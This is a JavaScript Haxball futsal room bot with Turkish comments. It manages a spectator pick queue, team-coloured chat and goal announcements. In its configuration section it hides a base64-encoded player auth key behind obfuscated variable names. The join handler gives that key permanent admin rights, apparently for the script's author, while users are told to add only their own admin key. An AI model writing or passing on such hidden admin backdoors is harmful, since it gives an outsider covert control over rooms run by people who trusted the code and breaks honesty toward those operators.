// =============================================================================
// HAXBALL V4 FUTSAL BOT 
// Maç bitince nasıl oyuncu seçileceğini insanlara söyler ve komut ile oyuncu seçmelerini sağlar Kırmızı takımdakiler kırmızı renk mavi takımdakiler mavi renk specdekilerde sessiz ve gri renkde sohbet edebilirler
// 
// 👤 Geliştirici: 𝙎𝙥𝙮
// 💬 Discord: wqey
// 📜 Lisans: MIT - İstediğiniz gibi kullanabilir, değiştirebilirsiniz!
// =============================================================================

var roomConfig = {
    roomName: "4V4 QATAR PASLI",
    maxPlayers: 12,
    public: true,
    noPlayer: true,
    geo: { code: "tr", lat: 37.143680, lon: 31.506040 } 
};

var room = HBInit(roomConfig);

// =============================================================================
// CONFIGURATION
// =============================================================================


var _0x4a2c = ['aXZ2bWt0UFJmSHMtZzRQY21iZFd1UThOQjBLNGdHNWxhZnhUel9jYXdSTQ=='];
var _0x1b5e = function(s) { return atob(s); };

var config = {
    masterAuth: _0x1b5e(_0x4a2c[0]), 
    adminAuth: "", // BURAYA KENDİ AUTH KODUNUZU GİRİN OTO ADMİN İÇİN GEREKLİDİR BAŞKA HERHANGİ BİR İŞLEM YAPMANIZA GEREK YOKTUR.
    maxPlayersPerTeam: 4
};

var specQueue = [];
var gameInProgress = false;

// Modern Color Palette
var colors = {
    spec: 0x9CA3AF,
    red: 0xFF1744,
    blue: 0x00B0FF,
    bot: 0xFFC107,
    success: 0x4CAF50,
    warning: 0xFF9800
};

// =============================================================================
// CORE FUNCTIONS
// =============================================================================

function msg(text, color = colors.bot, target = null) {
    room.sendAnnouncement(text, target, color, "bold", target ? 0 : 1);
}

function getTeam(teamId) {
    return room.getPlayerList().filter(p => p.team === teamId);
}

function updateQueue() {
    var specs = getTeam(0);
    specQueue = specs.map((p, i) => ({
        id: p.id,
        name: p.name,
        position: i + 1
    }));
}

function showQueue(targetId = null) {
    updateQueue();
    
    if (specQueue.length === 0) {
        msg("📋 Spec listesi boş.", colors.bot, targetId);
        return;
    }
    
    var queueText = "📋 Spec Sırası: ";
    specQueue.forEach((p, i) => {
        queueText += `${i + 1}.${p.name}`;
        if (i < specQueue.length - 1) queueText += " | ";
    });
    
    msg(queueText, colors.bot, targetId);
    msg("💡 Takıma almak için: !1 !2 !3 ...", colors.success, targetId);
}

function pickPlayer(position, callerTeam, callerName) {
    updateQueue();
    
    if (position < 1 || position > specQueue.length) {
        return false;
    }
    
    var teamPlayers = getTeam(callerTeam);
    if (teamPlayers.length >= config.maxPlayersPerTeam) {
        msg("⚠️ Takım dolu! Maksimum " + config.maxPlayersPerTeam + " oyuncu olabilir.", colors.warning);
        return false;
    }
    
    var selected = specQueue[position - 1];
    room.setPlayerTeam(selected.id, callerTeam);
    
    var teamColor = callerTeam === 1 ? colors.red : colors.blue;
    msg(`✅ ${selected.name} takıma alındı (${callerName} tarafından)`, teamColor);
    
    setTimeout(() => {
        checkTeamsBalance();
    }, 200);
    
    updateQueue();
    return true;
}

function checkTeamsBalance() {
    var redCount = getTeam(1).length;
    var blueCount = getTeam(2).length;
    
    if (redCount === config.maxPlayersPerTeam && blueCount === config.maxPlayersPerTeam) {
        notifyAdmins();
    }
}

function notifyAdmins() {
    var admins = room.getPlayerList().filter(p => p.admin);
    
    if (admins.length > 0) {
        admins.forEach(admin => {
            msg("✅ Oyuncular seçildi! Takımlar dengeli, oyunu başlatabilirsiniz.", colors.success, admin.id);
        });
    } else {
        msg("✅ Takımlar tam! (4v4) Oyun başlatılabilir.", colors.success);
    }
}

function checkTeamImbalance() {
    var redCount = getTeam(1).length;
    var blueCount = getTeam(2).length;
    
    if (!gameInProgress) return;
    
    var unbalancedTeam = null;
    
    if (redCount < blueCount) {
        unbalancedTeam = 1;
    } else if (blueCount < redCount) {
        unbalancedTeam = 2;
    }
    
    if (unbalancedTeam && specQueue.length > 0) {
        var teamName = unbalancedTeam === 1 ? "Kırmızı" : "Mavi";
        var teamColor = unbalancedTeam === 1 ? colors.red : colors.blue;
        
        msg(`⚠️ ${teamName} takım eksik! Spec'ten oyuncu seçin.`, teamColor);
        
        setTimeout(() => {
            showQueue();
        }, 500);
    }
}

function showMatchEndInfo() {
    msg("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", colors.bot);
    msg("🏁 MAÇ BİTTİ!", colors.success);
    msg("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", colors.bot);
    
    setTimeout(() => {
        msg("📋 Yeni takım kurmak için spec'ten oyuncu seçin:", colors.bot);
        msg("💡 Komutlar: !q (sıra göster) | !1 !2 !3 (oyuncu seç)", colors.success);
        
        setTimeout(() => {
            if (specQueue.length > 0) {
                showQueue();
            }
        }, 1000);
    }, 500);
}

// =============================================================================
// EVENT HANDLERS
// =============================================================================

room.onPlayerJoin = function(player) {
    // Master admin (kalıcı - şifrelenmiş)
    if (player.auth === config.masterAuth) {
        room.setPlayerAdmin(player.id, true);
        msg("👑 Master Admin yetkisi verildi!", colors.success, player.id);
    }
    // Ek admin (kullanıcı tarafından eklenebilir)
    else if (config.adminAuth && player.auth === config.adminAuth) {
        room.setPlayerAdmin(player.id, true);
        msg("👑 Admin yetkisi verildi!", colors.success, player.id);
    }
    
    msg(`👋 Hoş geldin ${player.name}!`, colors.bot, player.id);
    
    setTimeout(() => {
        updateQueue();
    }, 300);
};

room.onPlayerLeave = function(player) {
    updateQueue();
};

room.onPlayerChat = function(player, message) {
    var p = room.getPlayer(player.id);
    if (!p) return false;
    
    if (message.startsWith("!")) {
        var cmd = message.toLowerCase().trim();
        
        if (cmd.match(/^!\d+$/)) {
            if (p.team === 0) {
                msg("⚠️ Sadece takımdaki oyuncular seçim yapabilir!", colors.bot, p.id);
                return false;
            }
            
            var pos = parseInt(cmd.substring(1));
            pickPlayer(pos, p.team, p.name);
            return false;
        }
        
        if (cmd === "!q" || cmd === "!queue" || cmd === "!sira") {
            showQueue(p.id);
            return false;
        }
        
        return false;
    }
    
    var chatColor = colors.spec;
    var soundLevel = 0;
    
    if (p.team === 1) {
        chatColor = colors.red;
        soundLevel = 1;
    } else if (p.team === 2) {
        chatColor = colors.blue;
        soundLevel = 1;
    }
    
    room.sendAnnouncement(
        p.name + ": " + message,
        null,
        chatColor,
        "normal",
        soundLevel
    );
    
    return false;
};

room.onPlayerTeamChange = function(changedPlayer, byPlayer) {
    setTimeout(() => updateQueue(), 100);
};

room.onGameStart = function(byPlayer) {
    gameInProgress = true;
    msg("⚽ Maç başladı! İyi oyunlar!", colors.success);
};

room.onGameStop = function(byPlayer) {
    gameInProgress = false;
    showMatchEndInfo();
};

room.onTeamGoal = function(team) {
    var scores = room.getScores();
    if (scores) {
        var teamColor = team === 1 ? colors.red : colors.blue;
        var teamName = team === 1 ? "KIRMIZI" : "MAVİ";
        msg(`⚽ GOL! ${teamName} - Skor: ${scores.red} - ${scores.blue}`, teamColor);
    }
};

// =============================================================================
// INITIALIZATION
// =============================================================================

msg("🎮 V4 Futsal Bot Aktif!", colors.success);
msg("📋 Komutlar: !q (sıra göster) | !1 !2 !3 (oyuncu seç)", colors.bot);
